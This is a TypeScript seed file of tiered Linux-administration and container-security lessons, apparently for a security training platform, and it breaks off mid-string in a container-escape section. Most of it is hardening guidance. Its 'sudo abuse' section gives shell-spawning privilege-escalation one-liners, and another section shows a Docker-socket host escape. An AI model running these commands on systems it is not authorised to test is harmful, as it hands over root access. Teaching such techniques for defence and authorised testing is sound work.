import type { SeedArticle } from "./types";

export const LINUX_SYSTEMS_ARTICLES: SeedArticle[] = [
  // ── linux-admin L0 ──────────────────────────────────────────────────────
  {
    competencyId: "linux-admin",
    depthTier: 0,
    title: "Linux Administration Overview",
    recommendedLevel: 0,
    sections: [
      {
        heading: "What is Linux administration",
        content: `Linux administration encompasses managing users, services, file systems, and security on Linux-based systems. As the dominant server operating system (powering over 90% of public cloud workloads according to the Linux Foundation's 2024 report), understanding Linux is foundational for any cybersecurity professional.

The kernel handles hardware abstraction, process scheduling, and memory management. Userspace tools (systemd, coreutils, package managers) provide the interface administrators use daily.`,
        sortOrder: 0,
      },
      {
        heading: "Why it matters for security",
        content: `Most servers you will encounter in penetration testing run Linux. Understanding how the system is configured — users, permissions, services, firewall rules — lets you identify misconfigurations that lead to privilege escalation or lateral movement.

Defensive work (hardening, monitoring, incident response) also requires deep Linux knowledge. CIS Benchmarks for Linux distributions provide concrete hardening checklists used across the industry.`,
        sortOrder: 1,
      },
      {
        heading: "Key vocabulary",
        content: `- **Kernel**: The core of the OS, managing hardware and system calls
- **Userspace**: Everything running above the kernel (shells, daemons, applications)
- **systemd**: The init system and service manager on most modern distributions
- **UID/GID**: User and Group IDs — numeric identifiers that control access
- **SUID/SGID**: Special permission bits that run a binary as the file owner/group
- **PAM**: Pluggable Authentication Modules — the framework controlling how authentication works
- **SELinux/AppArmor**: Mandatory Access Control (MAC) frameworks layered on top of standard DAC permissions`,
        sortOrder: 2,
      },
      {
        heading: "Sources",
        content: `- Linux Foundation, "2024 State of Linux Kernel Development"
- CIS Benchmarks for Ubuntu, Debian, RHEL (cisecurity.org)
- man pages: systemd(1), passwd(5), sudoers(5)`,
        sortOrder: 3,
      },
    ],
  },

  // ── linux-admin L1 ──────────────────────────────────────────────────────
  {
    competencyId: "linux-admin",
    depthTier: 1,
    title: "Linux Administration Basics",
    recommendedLevel: 1,
    sections: [
      {
        heading: "User and group management",
        content: `Create users with \`useradd\` or the friendlier \`adduser\` wrapper. Key files:

\`\`\`bash
# Create a user with a home directory and bash shell
useradd -m -s /bin/bash pentester

# Set password
passwd pentester

# Add user to the sudo group
usermod -aG sudo pentester

# Check group membership
id pentester
# uid=1001(pentester) gid=1001(pentester) groups=1001(pentester),27(sudo)
\`\`\`

User data lives in \`/etc/passwd\` (accounts), \`/etc/shadow\` (hashed passwords), and \`/etc/group\` (group membership). The shadow file is only readable by root — if you can read it during a pentest, you can crack the hashes offline.`,
        sortOrder: 0,
      },
      {
        heading: "File permissions and special bits",
        content: `Linux permissions use the rwx model for owner, group, and others:

\`\`\`bash
# View permissions
ls -la /usr/bin/passwd
-rwsr-xr-x 1 root root 68208 Mar 14 2023 /usr/bin/passwd

# chmod with octal notation
chmod 750 script.sh    # rwxr-x---
chmod u+s binary       # Set SUID bit
chmod g+s directory    # Set SGID bit
\`\`\`

The SUID bit (\`s\` in owner execute position) is critical in security — binaries with SUID run as the file owner (often root). Finding unexpected SUID binaries is a common privilege escalation vector:

\`\`\`bash
find / -perm -4000 -type f 2>/dev/null
\`\`\``,
        sortOrder: 1,
      },
      {
        heading: "Service management with systemd",
        content: `\`\`\`bash
# List running services
systemctl list-units --type=service --state=running

# Check a specific service
systemctl status sshd

# Enable a service at boot
systemctl enable nginx

# View logs for a service
journalctl -u sshd -f
\`\`\`

Understanding which services are running and listening is essential for both hardening (disable unnecessary services) and enumeration (identify attack surface).`,
        sortOrder: 2,
      },
      {
        heading: "Package management essentials",
        content: `\`\`\`bash
# Debian/Ubuntu
apt update && apt upgrade
apt install nmap
dpkg -l | grep ssh

# RHEL/Fedora
dnf update
dnf install nmap
rpm -qa | grep ssh
\`\`\`

Always keep systems patched. Unpatched services are a primary attack vector — CVE databases track known vulnerabilities tied to specific package versions.`,
        sortOrder: 3,
      },
      {
        heading: "Sources",
        content: `- man pages: useradd(8), chmod(1), systemctl(1), journalctl(1)
- POSIX.1-2017, IEEE Std 1003.1 (file permissions model)
- CIS Benchmark for Ubuntu Linux 22.04 LTS`,
        sortOrder: 4,
      },
    ],
  },

  // ── linux-admin L2 ──────────────────────────────────────────────────────
  {
    competencyId: "linux-admin",
    depthTier: 2,
    title: "Linux Administration in Depth",
    recommendedLevel: 2,
    sections: [
      {
        heading: "SSH hardening",
        content: `SSH is the primary remote access method and a frequent attack target. Key hardening steps in \`/etc/ssh/sshd_config\`:

\`\`\`bash
# Disable root login
PermitRootLogin no

# Disable password authentication (use keys only)
PasswordAuthentication no

# Restrict to specific users
AllowUsers admin deploy

# Change default port (security through obscurity, but reduces noise)
Port 2222

# Protocol 1 was removed in OpenSSH 7.6 (2017) — no directive needed
# Restrict key exchange algorithms to modern ones
KexAlgorithms curve25519-sha256,curve25519-sha256@libssh.org
\`\`\`

Generate an Ed25519 key pair (recommended over RSA per NIST SP 800-186):

\`\`\`bash
ssh-keygen -t ed25519 -C "admin@server"
ssh-copy-id -i ~/.ssh/id_ed25519.pub user@server
\`\`\`

Monitor authentication attempts:

\`\`\`bash
# Failed login attempts
journalctl -u sshd | grep "Failed password"
grep "Failed password" /var/log/auth.log | tail -20
\`\`\``,
        sortOrder: 0,
      },
      {
        heading: "Firewall configuration with nftables",
        content: `nftables replaced iptables as the default firewall framework in modern kernels. Basic configuration:

\`\`\`bash
# List current ruleset
nft list ruleset

# Create a basic firewall
nft add table inet filter
nft add chain inet filter input { type filter hook input priority 0 \\; policy drop \\; }
nft add chain inet filter forward { type filter hook forward priority 0 \\; policy drop \\; }
nft add chain inet filter output { type filter hook output priority 0 \\; policy accept \\; }

# Allow established connections
nft add rule inet filter input ct state established,related accept

# Allow loopback
nft add rule inet filter input iif lo accept

# Allow SSH
nft add rule inet filter input tcp dport 22 accept
\`\`\`

For simpler setups, \`ufw\` (Ubuntu) provides a friendlier interface:

\`\`\`bash
ufw default deny incoming
ufw default allow outgoing
ufw allow 22/tcp
ufw enable
\`\`\``,
        sortOrder: 1,
      },
      {
        heading: "Sudo configuration and abuse",
        content: `The \`/etc/sudoers\` file (edited with \`visudo\`) controls privilege escalation. Common misconfigurations that lead to root:

\`\`\`bash
# Check sudo privileges
sudo -l

# Dangerous entries that allow escalation:
# user ALL=(ALL) NOPASSWD: /usr/bin/vim
# user ALL=(ALL) NOPASSWD: /usr/bin/find
# user ALL=(ALL) NOPASSWD: /usr/bin/python3
\`\`\`

Many binaries with sudo access can spawn a shell. GTFOBins (gtfobins.github.io) catalogs these techniques:

\`\`\`bash
# vim with sudo
sudo vim -c '!bash'

# find with sudo
sudo find / -exec /bin/bash \\;

# python3 with sudo
sudo python3 -c 'import os; os.system("/bin/bash")'
\`\`\``,
        sortOrder: 2,
      },
      {
        heading: "Cron and scheduled tasks",
        content: `Cron jobs run commands on schedule. Security implications:

\`\`\`bash
# List cron jobs for current user
crontab -l

# System-wide cron directories
ls -la /etc/cron.d/
ls -la /etc/cron.daily/

# Check for writable cron scripts
find /etc/cron* -writable 2>/dev/null

# Monitor cron execution
grep CRON /var/log/syslog
\`\`\`

A writable script called by root's crontab is a direct path to privilege escalation. Also check for wildcard injection in cron commands using tar, rsync, or other tools that interpret filenames as arguments.`,
        sortOrder: 3,
      },
      {
        heading: "Log management and monitoring",
        content: `Key log locations:

| Log | Location | Contents |
|-----|----------|----------|
| Auth | \`/var/log/auth.log\` | Login attempts, sudo usage |
| System | \`/var/log/syslog\` | General system events |
| Kernel | \`/var/log/kern.log\` | Kernel messages |
| Journal | \`journalctl\` | systemd unified log |

\`\`\`bash
# Recent authentication failures
journalctl -u sshd --since "1 hour ago" | grep -i fail

# Watch logs in real time
tail -f /var/log/auth.log

# Rotate logs manually
logrotate -f /etc/logrotate.conf
\`\`\`

Centralized logging (rsyslog forwarding, or tools like Loki) prevents attackers from covering tracks by deleting local logs.`,
        sortOrder: 4,
      },
      {
        heading: "Sources",
        content: `- NIST SP 800-186 (recommendations for key establishment schemes)
- CIS Benchmark for Ubuntu Linux 22.04 LTS, Sections 5.2 (SSH), 4.1 (Firewall)
- man pages: sshd_config(5), nft(8), sudoers(5), crontab(5)
- GTFOBins: gtfobins.github.io`,
        sortOrder: 5,
      },
    ],
  },

  // ── linux-admin L3 ──────────────────────────────────────────────────────
  {
    competencyId: "linux-admin",
    depthTier: 3,
    title: "Advanced Linux Hardening",
    recommendedLevel: 3,
    sections: [
      {
        heading: "Mandatory Access Control with AppArmor",
        content: `AppArmor confines programs to a set of allowed resources using per-application profiles. Unlike DAC (owner/group/other), MAC enforcement applies even to root-owned processes.

\`\`\`bash
# Check AppArmor status
aa-status

# List profiles and their enforcement mode
aa-status | grep -A1 "profiles are in"

# Put a profile in complain mode (log but don't block)
aa-complain /etc/apparmor.d/usr.sbin.nginx

# Enforce a profile
aa-enforce /etc/apparmor.d/usr.sbin.nginx
\`\`\`

Creating a custom profile:

\`\`\`bash
# Generate a profile skeleton
aa-genprof /usr/local/bin/myapp

# The profile lives in /etc/apparmor.d/
# Key directives:
# /var/log/myapp/** rw,     # read/write to log directory
# /etc/myapp.conf r,         # read config
# network inet tcp,          # allow TCP
# deny /etc/shadow r,        # explicitly deny shadow access
\`\`\``,
        sortOrder: 0,
      },
      {
        heading: "Kernel hardening with sysctl",
        content: `The \`/etc/sysctl.conf\` file tunes kernel parameters. Security-relevant settings:

\`\`\`bash
# Disable IP forwarding (unless this is a router)
net.ipv4.ip_forward = 0

# Ignore ICMP redirects
net.ipv4.conf.all.accept_redirects = 0
net.ipv6.conf.all.accept_redirects = 0

# Enable SYN cookies (SYN flood protection)
net.ipv4.tcp_syncookies = 1

# Restrict dmesg to root
kernel.dmesg_restrict = 1

# Restrict kernel pointer leaks
kernel.kptr_restrict = 2

# Enable ASLR
kernel.randomize_va_space = 2

# Restrict ptrace scope
kernel.yama.ptrace_scope = 1
\`\`\`

Apply changes: \`sysctl -p\`

These settings directly affect exploitation difficulty. \`ptrace_scope = 1\` prevents non-parent processes from tracing, blocking some injection techniques. \`kptr_restrict = 2\` hides kernel addresses from unprivileged users, complicating kernel exploitation.`,
        sortOrder: 1,
      },
      {
        heading: "Audit framework with auditd",
        content: `auditd provides kernel-level auditing of system calls, file access, and user actions. Essential for compliance (PCI-DSS, HIPAA) and forensics.

\`\`\`bash
# Install and enable
apt install auditd
systemctl enable auditd

# Watch a sensitive file
auditctl -w /etc/shadow -p rwa -k shadow_access

# Monitor command execution by a user
auditctl -a always,exit -F arch=b64 -S execve -F uid=1001 -k user_commands

# Search audit logs
ausearch -k shadow_access --start today
aureport --auth --summary
\`\`\`

Key audit rules for security monitoring:

\`\`\`bash
# /etc/audit/rules.d/security.rules
-w /etc/passwd -p wa -k identity
-w /etc/shadow -p wa -k identity
-w /etc/sudoers -p wa -k sudo_changes
-a always,exit -F arch=b64 -S execve -k commands
-w /var/log/ -p wa -k log_tampering
\`\`\``,
        sortOrder: 2,
      },
      {
        heading: "PAM configuration deep dive",
        content: `PAM modules in \`/etc/pam.d/\` control authentication flows. Each line specifies a module type (auth, account, password, session), a control flag, and a module:

\`\`\`
# /etc/pam.d/common-auth
auth    required    pam_faillock.so preauth
auth    required    pam_unix.so
auth    required    pam_faillock.so authfail

# Lock account after 5 failed attempts
# /etc/security/faillock.conf
deny = 5
unlock_time = 900
\`\`\`

Password quality enforcement:

\`\`\`bash
# /etc/pam.d/common-password
password requisite pam_pwquality.so retry=3 minlen=12 difok=3 ucredit=-1 lcredit=-1 dcredit=-1 ocredit=-1
\`\`\`

PAM is also where you configure MFA (pam_google_authenticator), SSH key enforcement, and account lockout policies.`,
        sortOrder: 3,
      },
      {
        heading: "Filesystem security",
        content: `Mount options in \`/etc/fstab\` restrict what can happen on each partition:

\`\`\`bash
# Harden /tmp - no executables, no SUID, no device files
tmpfs /tmp tmpfs defaults,noexec,nosuid,nodev 0 0

# Harden /var/tmp
/tmp /var/tmp none bind 0 0

# Read-only /boot
UUID=... /boot ext4 defaults,ro,nosuid,noexec,nodev 0 1
\`\`\`

File integrity monitoring with AIDE:

\`\`\`bash
# Initialize the database
aide --init
mv /var/lib/aide/aide.db.new /var/lib/aide/aide.db

# Check for changes
aide --check
\`\`\``,
        sortOrder: 4,
      },
      {
        heading: "Network service hardening",
        content: `Reduce attack surface by disabling unnecessary services and restricting network exposure:

\`\`\`bash
# Find all listening services
ss -tlnp

# Disable unnecessary services
systemctl disable --now avahi-daemon
systemctl disable --now cups

# Bind services to specific interfaces
# In /etc/ssh/sshd_config:
ListenAddress 10.0.0.5

# TCP wrappers (if supported)
# /etc/hosts.allow
sshd: 10.0.0.0/24
# /etc/hosts.deny
ALL: ALL
\`\`\``,
        sortOrder: 5,
      },
      {
        heading: "Sources",
        content: `- CIS Benchmark for Ubuntu Linux 22.04 LTS v2.0
- NIST SP 800-123 (Guide to General Server Security)
- Red Hat Security Guide: access.redhat.com/documentation
- man pages: apparmor(7), auditctl(8), pam.conf(5), sysctl.conf(5), fstab(5)`,
        sortOrder: 6,
      },
    ],
  },

  // ── linux-admin L4 ──────────────────────────────────────────────────────
  {
    competencyId: "linux-admin",
    depthTier: 4,
    title: "Linux Security Architecture",
    recommendedLevel: 4,
    sections: [
      {
        heading: "SELinux policies and contexts",
        content: `SELinux provides fine-grained MAC through security contexts (user:role:type:level). Every process and file gets a context label:

\`\`\`bash
# View file contexts
ls -Z /var/www/html/
# -rw-r--r--. root root unconfined_u:object_r:httpd_sys_content_t:s0 index.html

# View process contexts
ps auxZ | grep httpd
# system_u:system_r:httpd_t:s0  root  1234  ...

# Change file context
chcon -t httpd_sys_content_t /var/www/custom/file.html

# Restore default contexts
restorecon -Rv /var/www/
\`\`\`

The type enforcement (TE) policy defines which types (processes) can access which types (files). When a confined process (\`httpd_t\`) tries to access an unauthorized type, SELinux denies it — even if DAC permissions allow it.

Troubleshooting denials:

\`\`\`bash
# View recent denials
ausearch -m avc --start today

# Generate a policy module to allow a specific action
audit2allow -a -M mypolicy
semodule -i mypolicy.pp
\`\`\``,
        sortOrder: 0,
      },
      {
        heading: "Namespaces and cgroups for isolation",
        content: `Linux namespaces provide the isolation primitives that containers use:

| Namespace | Isolates |
|-----------|----------|
| PID | Process ID tree |
| NET | Network stack |
| MNT | Mount points |
| UTS | Hostname |
| IPC | Inter-process communication |
| USER | UID/GID mapping |
| CGROUP | Cgroup root |

\`\`\`bash
# Run a command in a new namespace
unshare --pid --fork --mount-proc bash
# Inside: ps aux shows only the bash process

# View namespace of a process
ls -la /proc/$$/ns/

# Enter another process's namespace
nsenter -t <PID> -n -p bash
\`\`\`

cgroups v2 limit resource consumption:

\`\`\`bash
# Create a cgroup
mkdir /sys/fs/cgroup/mygroup

# Limit memory to 256MB
echo 268435456 > /sys/fs/cgroup/mygroup/memory.max

# Limit CPU to 50%
echo "50000 100000" > /sys/fs/cgroup/mygroup/cpu.max

# Add a process
echo $PID > /sys/fs/cgroup/mygroup/cgroup.procs
\`\`\``,
        sortOrder: 1,
      },
      {
        heading: "Secure boot and measured boot",
        content: `UEFI Secure Boot verifies that each component in the boot chain is signed with a trusted key:

\`\`\`
Firmware (UEFI) → Shim (signed by Microsoft) → GRUB (signed by distro) → Kernel (signed by distro) → Modules
\`\`\`

\`\`\`bash
# Check Secure Boot status
mokutil --sb-state

# List enrolled keys
mokutil --list-enrolled

# Sign a custom kernel module
/usr/src/kernels/$(uname -r)/scripts/sign-file sha256 \\
  /root/signing_key.pem /root/signing_key.x509 module.ko
\`\`\`

For forensics and incident response, Secure Boot helps ensure the kernel itself hasn't been tampered with — a rootkit that modifies the kernel would break the signature chain.`,
        sortOrder: 2,
      },
      {
        heading: "Advanced network security",
        content: `Beyond basic firewalling, Linux offers deep network security controls:

\`\`\`bash
# nftables with connection tracking and rate limiting
nft add rule inet filter input tcp dport 22 ct state new \\
  limit rate 3/minute accept

# Block port scanning (detect and drop)
nft add rule inet filter input tcp flags syn tcp dport != { 22, 80, 443 } \\
  log prefix "PORTSCAN: " drop

# IP sets for dynamic blocklists
nft add set inet filter blocklist { type ipv4_addr \\; }
nft add rule inet filter input ip saddr @blocklist drop
nft add element inet filter blocklist { 10.0.0.100 }
\`\`\`

WireGuard for encrypted tunnels:

\`\`\`bash
# Generate keys
wg genkey | tee privatekey | wg pubkey > publickey

# Configure interface
ip link add wg0 type wireguard
wg set wg0 listen-port 51820 private-key ./privatekey \\
  peer <SERVER_PUBKEY> endpoint <SERVER_IP>:51820 \\
  allowed-ips 10.0.0.0/24
ip addr add 10.0.0.2/24 dev wg0
ip link set wg0 up
\`\`\``,
        sortOrder: 3,
      },
      {
        heading: "Automated hardening and compliance",
        content: `OpenSCAP automates CIS Benchmark checks:

\`\`\`bash
# Install
apt install libopenscap8 ssg-debian

# Run a CIS scan
oscap xccdf eval --profile cis_level1_server \\
  --results results.xml --report report.html \\
  /usr/share/xml/scap/ssg/content/ssg-ubuntu2204-ds.xml

# Remediate findings
oscap xccdf eval --remediate --profile cis_level1_server \\
  /usr/share/xml/scap/ssg/content/ssg-ubuntu2204-ds.xml
\`\`\`

Ansible playbooks for consistent hardening:

\`\`\`yaml
# roles/hardening/tasks/main.yml
- name: Ensure SSH root login is disabled
  lineinfile:
    path: /etc/ssh/sshd_config
    regexp: "^PermitRootLogin"
    line: "PermitRootLogin no"
  notify: restart sshd

- name: Set kernel parameters
  sysctl:
    name: "{{ item.key }}"
    value: "{{ item.value }}"
    sysctl_set: yes
  loop:
    - { key: "kernel.randomize_va_space", value: "2" }
    - { key: "net.ipv4.tcp_syncookies", value: "1" }
\`\`\``,
        sortOrder: 4,
      },
      {
        heading: "Sources",
        content: `- Red Hat SELinux User's Guide
- kernel.org documentation: cgroups v2, namespaces
- NIST SP 800-123 (Guide to General Server Security)
- UEFI Specification 2.10, Chapter 32 (Secure Boot)
- CIS Benchmark for Ubuntu Linux 22.04 LTS
- man pages: selinux(8), unshare(1), cgroups(7), nft(8)`,
        sortOrder: 5,
      },
    ],
  },

  // ── linux-admin L5 ──────────────────────────────────────────────────────
  {
    competencyId: "linux-admin",
    depthTier: 5,
    title: "Linux Internals for Security Experts",
    recommendedLevel: 5,
    sections: [
      {
        heading: "eBPF for security monitoring",
        content: `eBPF (extended Berkeley Packet Filter) runs sandboxed programs in the kernel, enabling powerful security monitoring without kernel module development:

\`\`\`bash
# Using bpftrace to trace all execve syscalls
bpftrace -e 'tracepoint:syscalls:sys_enter_execve {
  printf("%s %s\\n", comm, str(args->filename));
}'

# Monitor file opens by a specific user
bpftrace -e 'tracepoint:syscalls:sys_enter_openat /uid == 1001/ {
  printf("%s opened %s\\n", comm, str(args->filename));
}'

# Trace network connections
bpftrace -e 'kprobe:tcp_connect {
  printf("%s connecting...\\n", comm);
}'
\`\`\`

Tools like Falco and Tetragon use eBPF for runtime security enforcement — detecting container escapes, unexpected process execution, and suspicious file access in real time.

eBPF programs are verified by the kernel's BPF verifier before execution, guaranteeing they terminate and don't crash the kernel. This makes eBPF safer than kernel modules for production monitoring.`,
        sortOrder: 0,
      },
      {
        heading: "Linux Security Modules framework",
        content: `LSM provides hooks at security-critical kernel operations. SELinux, AppArmor, Smack, and TOMOYO are all LSM implementations:

\`\`\`
System call → VFS/network/IPC → LSM hook → Security module decision → Allow/Deny
\`\`\`

LSM stacking (available since kernel 5.1+) allows multiple LSMs to be active simultaneously:

\`\`\`bash
# Check active LSMs
cat /sys/kernel/security/lsm
# lockdown,capability,landlock,yama,apparmor

# Landlock (unprivileged sandboxing, since 5.13)
# Programs can self-restrict their filesystem access
\`\`\`

Landlock is notable because it allows unprivileged processes to restrict themselves — useful for sandboxing untrusted code without root or container overhead.`,
        sortOrder: 1,
      },
      {
        heading: "Rootkit detection and kernel integrity",
        content: `Kernel-level rootkits modify the system call table, hook functions, or hide processes/files. Detection approaches:

\`\`\`bash
# Check for hidden processes
ps aux | wc -l
ls /proc/ | grep -E "^[0-9]+$" | wc -l
# Discrepancy suggests hidden processes

# Verify kernel module list
lsmod
cat /proc/modules
# Compare for hidden modules

# Check system call table integrity
# (requires a known-good reference)
cat /proc/kallsyms | grep sys_call_table

# Use rkhunter
rkhunter --check --skip-keypress
\`\`\`

Linux Kernel Lockdown (since 5.4) restricts even root from modifying the running kernel:

\`\`\`bash
# Check lockdown mode
cat /sys/kernel/security/lockdown
# [none] integrity confidentiality

# integrity mode: prevents unsigned module loading, raw I/O
# confidentiality mode: also prevents reading kernel memory
\`\`\``,
        sortOrder: 2,
      },
      {
        heading: "Capability-based security",
        content: `Linux capabilities split root privileges into discrete units (defined in capabilities(7)):

\`\`\`bash
# View process capabilities
getpcaps $$

# Give a binary specific capabilities instead of SUID
setcap cap_net_bind_service=+ep /usr/local/bin/myserver
setcap cap_net_raw=+ep /usr/bin/tcpdump

# View binary capabilities
getcap /usr/bin/tcpdump
# /usr/bin/tcpdump cap_net_raw=ep

# Drop all capabilities in a process
capsh --drop=all -- -c "id"
\`\`\`

Key capabilities for security:

| Capability | Allows |
|------------|--------|
| CAP_SYS_ADMIN | Catch-all "root lite" — mount, namespace ops |
| CAP_NET_RAW | Raw sockets (packet capture, crafting) |
| CAP_SYS_PTRACE | ptrace (debugging, injection) |
| CAP_DAC_OVERRIDE | Bypass file permission checks |
| CAP_SETUID | Change UID |

Container escapes often exploit overly broad capability grants. The principle of least privilege applies: grant only the capabilities a process actually needs.`,
        sortOrder: 3,
      },
      {
        heading: "Seccomp and syscall filtering",
        content: `Seccomp (Secure Computing Mode) restricts which system calls a process can make. Docker and container runtimes use seccomp profiles extensively:

\`\`\`json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "architectures": ["SCMP_ARCH_X86_64"],
  "syscalls": [
    { "names": ["read", "write", "open", "close", "mmap", "exit_group"],
      "action": "SCMP_ACT_ALLOW" }
  ]
}
\`\`\`

\`\`\`bash
# Check if a process uses seccomp
grep Seccomp /proc/$PID/status
# Seccomp:     2  (2 = filter mode)

# Docker default profile blocks ~44 of ~300+ syscalls
# Including: mount, reboot, settimeofday, swapon
docker run --security-opt seccomp=custom.json myimage
\`\`\`

Combined with namespaces, cgroups, and capabilities, seccomp forms the fourth pillar of container isolation.`,
        sortOrder: 4,
      },
      {
        heading: "Sources",
        content: `- kernel.org: eBPF documentation, LSM framework, Landlock
- capabilities(7), seccomp(2) man pages
- NIST SP 800-190 (Application Container Security Guide)
- Falco documentation: falco.org
- Brendan Gregg, "BPF Performance Tools" (Addison-Wesley, 2019)`,
        sortOrder: 5,
      },
    ],
  },

  // ── containers-infra L0 ─────────────────────────────────────────────────
  {
    competencyId: "containers-infra",
    depthTier: 0,
    title: "Containers and Infrastructure Overview",
    recommendedLevel: 0,
    sections: [
      {
        heading: "What are containers",
        content: `Containers package an application with its dependencies into an isolated, reproducible unit. Unlike virtual machines, containers share the host kernel — they use Linux namespaces for isolation and cgroups for resource limits, making them lightweight (startup in milliseconds, not minutes).

Docker popularized containers in 2013, but the underlying Linux primitives (namespaces, cgroups, chroot) have existed since the early 2000s. The Open Container Initiative (OCI) now standardizes image and runtime specifications.`,
        sortOrder: 0,
      },
      {
        heading: "Why containers matter for security",
        content: `Containers are everywhere in modern infrastructure — CI/CD pipelines, microservices, cloud deployments. For security professionals:

- **Attack surface**: Misconfigured containers expose internal services, leak secrets, or allow container escapes
- **Forensics**: Container images are immutable layers — you can analyze exactly what was deployed
- **Isolation testing**: Run tools in isolated environments without affecting the host
- **Lab environments**: Quickly spin up vulnerable applications for practice (e.g., DVWA, Juice Shop)`,
        sortOrder: 1,
      },
      {
        heading: "Key vocabulary",
        content: `- **Image**: A read-only template containing the application and its dependencies
- **Container**: A running instance of an image
- **Dockerfile**: Instructions to build an image layer by layer
- **Registry**: A repository for storing and distributing images (Docker Hub, GHCR)
- **Compose**: A tool for defining multi-container applications in YAML
- **Volume**: Persistent storage mounted into a container
- **Orchestration**: Managing containers at scale (Kubernetes, Docker Swarm)`,
        sortOrder: 2,
      },
      {
        heading: "Sources",
        content: `- Open Container Initiative (OCI) specifications: opencontainers.org
- Docker documentation: docs.docker.com
- NIST SP 800-190 (Application Container Security Guide)`,
        sortOrder: 3,
      },
    ],
  },

  // ── containers-infra L1 ─────────────────────────────────────────────────
  {
    competencyId: "containers-infra",
    depthTier: 1,
    title: "Container Basics",
    recommendedLevel: 1,
    sections: [
      {
        heading: "Docker essentials",
        content: `\`\`\`bash
# Pull and run an image
docker pull nginx:latest
docker run -d -p 8080:80 --name web nginx

# List running containers
docker ps

# Execute a command inside a container
docker exec -it web bash

# View logs
docker logs web

# Stop and remove
docker stop web && docker rm web
\`\`\`

Key flags: \`-d\` (detach), \`-p host:container\` (port mapping), \`-v host:container\` (volume mount), \`--rm\` (auto-remove on exit).`,
        sortOrder: 0,
      },
      {
        heading: "Writing a Dockerfile",
        content: `\`\`\`dockerfile
FROM python:3.12-slim

WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY . .

EXPOSE 8000
USER nobody
CMD ["python", "server.py"]
\`\`\`

Best practices: use slim/alpine base images, run as non-root (\`USER nobody\`), minimize layers, don't copy secrets into the image.`,
        sortOrder: 1,
      },
      {
        heading: "Docker Compose for multi-container apps",
        content: `\`\`\`yaml
# compose.yml
services:
  web:
    build: .
    ports:
      - "8080:8000"
    depends_on:
      - db
    environment:
      DATABASE_URL: postgres://user:pass@db:5432/app

  db:
    image: postgres:16
    volumes:
      - pgdata:/var/lib/postgresql/data
    environment:
      POSTGRES_PASSWORD: pass

volumes:
  pgdata:
\`\`\`

\`\`\`bash
docker compose up -d
docker compose logs -f
docker compose down
\`\`\``,
        sortOrder: 2,
      },
      {
        heading: "Reverse proxies with nginx",
        content: `nginx commonly sits in front of application containers, handling TLS termination and routing:

\`\`\`nginx
server {
    listen 443 ssl;
    server_name app.example.com;

    ssl_certificate /etc/nginx/certs/fullchain.pem;
    ssl_certificate_key /etc/nginx/certs/privkey.pem;

    location / {
        proxy_pass http://web:8000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}
\`\`\``,
        sortOrder: 3,
      },
      {
        heading: "Sources",
        content: `- Docker documentation: docs.docker.com
- Compose specification: docs.docker.com/compose/compose-file
- nginx documentation: nginx.org/en/docs/`,
        sortOrder: 4,
      },
    ],
  },

  // ── containers-infra L2 ─────────────────────────────────────────────────
  {
    competencyId: "containers-infra",
    depthTier: 2,
    title: "Container Security in Depth",
    recommendedLevel: 2,
    sections: [
      {
        heading: "Image scanning and vulnerability management",
        content: `Container images inherit vulnerabilities from their base image and installed packages. Scan before deploying:

\`\`\`bash
# Scan with Trivy
trivy image nginx:latest
trivy image --severity HIGH,CRITICAL myapp:v1

# Scan a local Dockerfile
trivy config Dockerfile

# Scan a running container's filesystem
trivy fs --scanners vuln /
\`\`\`

Key findings to look for: CVEs in OS packages, outdated runtime versions, secrets accidentally baked into image layers. Pin image versions (\`nginx:1.25.3\`, not \`nginx:latest\`) for reproducibility.`,
        sortOrder: 0,
      },
      {
        heading: "Container runtime security",
        content: `Docker's default isolation is good but not bulletproof. Harden the runtime:

\`\`\`bash
# Run with limited capabilities
docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE myapp

# Read-only filesystem
docker run --read-only --tmpfs /tmp myapp

# No new privileges
docker run --security-opt=no-new-privileges myapp

# Resource limits
docker run --memory=256m --cpus=0.5 myapp

# Custom seccomp profile
docker run --security-opt seccomp=profile.json myapp
\`\`\`

Never run containers with \`--privileged\` in production — it gives the container almost full host access, including device access and capability grants.`,
        sortOrder: 1,
      },
      {
        heading: "Docker socket and API security",
        content: `The Docker socket (\`/var/run/docker.sock\`) is equivalent to root access on the host. If a container has access to the socket, it can:

\`\`\`bash
# Mount the host filesystem
docker run -v /:/host -it alpine chroot /host

# Start privileged containers
docker run --privileged -it alpine
\`\`\`

This is a common container escape vector. In pentests, look for:
- Containers with the socket mounted (\`-v /var/run/docker.sock:/var/run/docker.sock\`)
- Docker API exposed on the network (TCP 2375/2376)
- CI/CD agents with Docker access

Mitigation: use rootless Docker, or Podman which runs daemonless.`,
        sortOrder: 2,
      },
      {
        heading: "Multi-stage builds for minimal images",
        content: `Multi-stage builds separate the build environment from the runtime image, reducing attack surface:

\`\`\`dockerfile
# Build stage
FROM golang:1.22 AS builder
WORKDIR /app
COPY . .
RUN CGO_ENABLED=0 go build -o server

# Runtime stage — minimal image
FROM gcr.io/distroless/static-debian12
COPY --from=builder /app/server /server
USER nonroot
ENTRYPOINT ["/server"]
\`\`\`

Distroless images contain only the application and its runtime dependencies — no shell, no package manager, significantly fewer CVEs.`,
        sortOrder: 3,
      },
      {
        heading: "Secrets management in containers",
        content: `Never embed secrets in images or environment variables (visible in \`docker inspect\`):

\`\`\`bash
# BAD: secret in Dockerfile
ENV API_KEY=sk-secret123

# BAD: secret in compose.yml environment
environment:
  - API_KEY=sk-secret123

# BETTER: Docker secrets (Swarm mode)
echo "sk-secret123" | docker secret create api_key -

# BEST: External secrets manager
# Mount from Vault, AWS SSM, or similar at runtime
\`\`\`

Check image history for leaked secrets:

\`\`\`bash
docker history myimage --no-trunc
# May reveal secrets set in ENV or COPY commands
\`\`\``,
        sortOrder: 4,
      },
      {
        heading: "Sources",
        content: `- NIST SP 800-190 (Application Container Security Guide)
- CIS Docker Benchmark v1.6
- Trivy documentation: aquasecurity.github.io/trivy
- Docker security best practices: docs.docker.com/engine/security/`,
        sortOrder: 5,
      },
    ],
  },

  // ── containers-infra L3 ─────────────────────────────────────────────────
  {
    competencyId: "containers-infra",
    depthTier: 3,
    title: "Advanced Container Infrastructure",
    recommendedLevel: 3,
    sections: [
      {
        heading: "Container escape techniques",
        content: `Understanding escape vectors is essential for both offense and defense:

\`\`\`bash
# Check if running inside a container
cat /proc/1/cgroup 2>/dev/null | grep -qi docker && echo "In Docker"
